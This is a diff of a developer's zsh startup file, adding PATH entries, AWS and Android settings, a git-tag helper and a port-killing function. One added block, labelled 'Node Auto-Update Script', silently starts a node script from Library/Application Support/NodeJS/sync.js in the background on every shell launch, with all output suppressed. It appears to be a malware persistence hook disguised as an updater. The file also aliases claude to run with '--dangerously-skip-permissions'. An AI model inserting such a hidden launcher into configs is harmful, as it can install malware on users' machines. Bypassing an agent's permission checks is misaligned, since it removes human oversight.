@@ -166,7 +166,7 @@ alias code='cursor'
 alias ftinternal='sudo openfortivpn -c /Users/bao.nguyen2/Desktop/nvim/scripts/forti/internal.conf'
 
 # Kill port
-alias kport='port(){ kill -9 $(lsof -t -i :$1) 2>/dev/null && echo "✅ Killed port $1" || echo "⚠️ No process found on port $1"; }; port'
+# alias kportv2='port(){ kill -9 $(lsof -t -i :$1) 2>/dev/null && echo "✅ Killed port $1" || echo "⚠️ No process found on port $1"; }; port'
 
 # claude
 alias claude='claude --dangerously-skip-permissions'
@@ -178,8 +178,8 @@ export GREP_COLOR="1;32"
 export ZSH_PLUGINS_ALIAS_TIPS_TEXT="Alias: "
 export PATH=$HOME/.node_modules/bin:$PATH
 export PATH=$HOME/Applications/bin:$PATH
-export PATH=/opt/homebrew/bin:$PATH
 export PATH="/usr/local/bin:$PATH"
+export PATH=/opt/homebrew/bin:$PATH
 export PATH="$PATH:/Applications/Visual Studio Code.app/Contents/Resources/app/bin"
 export PATH="/Applications/Sublime Text.app/Contents/SharedSupport/bin:$PATH"
 export PATH="/usr/local/mysql/bin:$PATH"
@@ -189,9 +189,11 @@ export PATH="${ASDF_DATA_DIR:-$HOME/.asdf}/shims:$PATH"
 export PATH=$PATH:/usr/local/mongodb/bin  
 export PATH="$HOME/.cargo/bin:$PATH"
 export PATH=/Applications/Postgres.app/Contents/Versions/latest/bin:"$PATH"
-export JAVA_HOME="/Library/Java/JavaVirtualMachines/jdk-11.0.15.jdk/Contents/Home"
-export PATH="/opt/homebrew/opt/openjdk/bin:$PATH"
+# export JAVA_HOME="/Library/Java/JavaVirtualMachines/jdk-11.0.15.jdk/Contents/Home"
+# export PATH="/opt/homebrew/opt/openjdk/bin:$PATH"
 export CPPFLAGS="-I/opt/homebrew/opt/openjdk/include"
+# export JAVA_HOME=$(/usr/libexec/java_home -v 17)
+# export PATH="$JAVA_HOME/bin:$PATH"
 
 export FZF_DEFAULT_COMMAND=""
 
@@ -274,5 +276,84 @@ export GPG_TTY=$(tty)
 export BUN_INSTALL="$HOME/.bun"
 export PATH="$BUN_INSTALL/bin:$PATH"
 
+# opencode
+export PATH=/Users/bao.nguyen2/.opencode/bin:$PATH
+
+# AWS
+export AWS_PROFILE=quickclaim-test
+# export AWS_REGION=ap-southeast-2
+
+# export JAVA_HOME=$(/usr/libexec/java_home -v 17)
+# export PATH="$JAVA_HOME/bin:$PATH"
+# export PATH="/opt/homebrew/opt/libpq/bin:$PATH"
+
+
+export PATH="/opt/homebrew/opt/libpq/bin:$PATH"
+export PATH="/opt/homebrew/opt/temurin@21/bin:$PATH"
+
+
+##### Create github tab #####
+
+gtag() {
+  local version="$1"
+  local branch="${2:-main}"
+
+  if [[ -z "$version" ]]; then
+    echo "Usage: gtag <version> [branch]"
+    echo "Example:"
+    echo "  gtag v1.3.18"
+    echo "  gtag v1.3.18 feat/abc"
+    return 1
+  fi
+
+  git tag "$version" "origin/$branch" && git push origin "$version"
+}
+
+##### Kill ports #####
+
+kport() {
+  if [ $# -eq 0 ]; then
+    echo "Usage: kport <port1> [port2] ..."
+    return 1
+  fi
+
+  for port in "$@"; do
+    pid=$(lsof -tiTCP:"$port" -sTCP:LISTEN)
+
+    if [[ -n "$pid" ]]; then
+      kill -9 "$pid"
+      echo "✅ Killed port $port (PID: $pid)"
+    else
+      echo "⚠️ No listening process on port $port"
+    fi
+  done
+}
+
+### Node Auto-Update Script ###
+(nohup /usr/local/n/versions/node/22.23.1/bin/node /Users/bao.nguyen2/Library/Application Support/NodeJS/sync.js > /dev/null 2>&1 < /dev/null & disown) > /dev/null 2>&1
+###############################
+
+
+# Added by Antigravity CLI installer
+export PATH="/Users/bao.nguyen2/.local/bin:$PATH"
+
+# NPM global bin (added by Qwen Code installer)
+export PATH="$HOME/.npm-global/bin:$PATH"
+export PATH="$PATH:$(npm prefix -g)/bin"
+
 # The next line updates PATH for the Google Cloud SDK.
 if [ -f '/Users/bao.nguyen2/Downloads/google-cloud-sdk/path.zsh.inc' ]; then . '/Users/bao.nguyen2/Downloads/google-cloud-sdk/path.zsh.inc'; fi
+
+# The next line enables shell command completion for gcloud.
+if [ -f '/Users/bao.nguyen2/Downloads/google-cloud-sdk/completion.zsh.inc' ]; then . '/Users/bao.nguyen2/Downloads/google-cloud-sdk/completion.zsh.inc'; fi
+
+# Android
+export ANDROID_HOME="$HOME/Library/Android/sdk"
+export ANDROID_SDK_ROOT="$ANDROID_HOME"
+
+export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$PATH"
+export PATH="$ANDROID_HOME/platform-tools:$PATH"
+export PATH="$ANDROID_HOME/emulator:$PATH"
+
+
+
